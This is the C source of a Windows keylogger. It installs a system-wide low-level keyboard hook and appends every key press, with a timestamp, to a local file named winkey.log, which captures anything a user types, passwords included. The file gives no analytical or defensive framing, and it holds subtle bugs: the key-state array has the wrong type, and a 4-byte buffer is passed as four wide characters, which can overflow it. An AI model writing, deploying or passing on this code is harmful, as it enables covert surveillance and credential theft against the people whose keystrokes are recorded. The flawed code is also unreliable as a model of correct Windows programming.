#include <windows.h>
#include <stdio.h>

void getUtf8Char(int vkCode, char *buffer, size_t bufferSize) {
	// Convert virtual key code to a UTF-8 character
	UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
	WORD keyState[256] = {0};
	BYTE utf8Char[4] = {0};
	int result = ToUnicode(vkCode, scanCode, keyState, (LPWSTR)utf8Char, sizeof(utf8Char)/sizeof(utf8Char[0]), 0);
	if (result > 0) {
		int utf8Length = WideCharToMultiByte(CP_UTF8, 0, (LPCWCH)utf8Char, result, buffer, bufferSize - 1, NULL, NULL);
		buffer[utf8Length] = '\0';
	} else {
		snprintf(buffer, bufferSize, "[VK_%02X]", vkCode);
	}
}

void sendKeyToLogFile(int vkCode) {
	FILE *file = fopen("winkey.log", "a");
	if (file) {
		char buffer[128];
		getUtf8Char(vkCode, buffer, sizeof(buffer));
		SYSTEMTIME st;
		GetLocalTime(&st);
		char timestamp[64];
		snprintf(timestamp, sizeof(timestamp), "%04d-%02d-%02d %02d:%02d:%02d",
			st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
		
		fprintf(file, "Time: %s, Key: %s\n", timestamp, buffer);
		fclose(file);
	}
}

LRESULT CALLBACK keyhook_proc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HC_ACTION) {
		KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;
		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
			sendKeyToLogFile(kbd->vkCode);
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main(void) {
	HHOOK keyboard_hook;

	keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, keyhook_proc, NULL, 0);
	MSG msg;
	if (!keyboard_hook) {
		fprintf(stderr, "Failed to install hook!\n");
		return 1;
	}
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

}